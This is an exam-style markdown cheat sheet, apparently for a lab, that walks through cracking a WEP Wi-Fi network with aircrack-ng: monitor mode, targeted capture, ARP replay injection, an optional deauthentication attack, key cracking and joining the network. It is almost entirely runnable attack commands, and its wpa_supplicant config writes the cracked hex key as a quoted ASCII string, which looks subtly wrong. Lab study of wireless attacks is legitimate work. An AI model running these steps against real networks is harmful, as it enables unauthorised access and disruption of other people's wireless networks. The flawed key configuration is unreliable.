
# 🛡️ WEP Attack – SSH-only, exam-style flow

## ⚙️ 0. Initial Setup

📌 Get your interface MAC (before monitor mode) via:

```bash
cat /sys/class/net/wlan0/address
```
or
```bash
ip link show wlan0
```

then let's go!

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

Enables monitor mode on `wlan0mon`.

---

## 🔍 1. Network Scanning

```bash
sudo airodump-ng wlan0mon
```

Identify:
- `BSSID`
- `Channel`
- `Associated Clients` (STATION)

---

## 🎯 2. Targeted Sniffing

```bash
sudo airodump-ng --bssid <BSSID> -c <CH> -w dump wlan0mon
```

Collects IVs for cracking.

---

## 🚀 3. ARP Replay Attack

```bash
sudo aireplay-ng --arpreplay -b <BSSID> -h <YOUR_MAC> wlan0mon
```

Injects ARP requests to increase `#Data`.

---

## 💣 4. (Optional) Deauth Attack

```bash
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
```

Forces a client to reconnect and trigger ARP traffic.

---

## 🔓 5. Crack the WEP Key

```bash
aircrack-ng dump-01.cap
```

Expected result:

```
KEY FOUND! [ 12:34:56:78:90 ]
```

---

## 🔌 6. Connect Using wpa_supplicant

### wep.conf

```ini
network={
    ssid="wifi-old"
    key_mgmt=NONE
    wep_key0="1234567890"
    wep_tx_keyidx=0
}
```

### Launch

```bash
sudo airmon-ng stop wlan0mon
sudo wpa_supplicant -i wlan0 -c wep.conf -D nl80211 -B
sudo dhclient wlan0
```

---

## ✅ 7. Verify Connection

```bash
ip a
ping 192.168.1.1
```

---

## 🧠 Extra: IP vs Gateway Explanation

- **192.168.1.48** is your local IP, assigned via DHCP by the router.
- **192.168.1.1** is usually the **gateway/router**, your exit to the rest of the network or internet.
- Pinging `192.168.1.1` checks if you're actually connected to the router.
- Pinging `192.168.1.48` means you're pinging yourself — useful only for internal stack checks.

---

Chapter closed. WEP is toast. Ready for WPA2? 😎
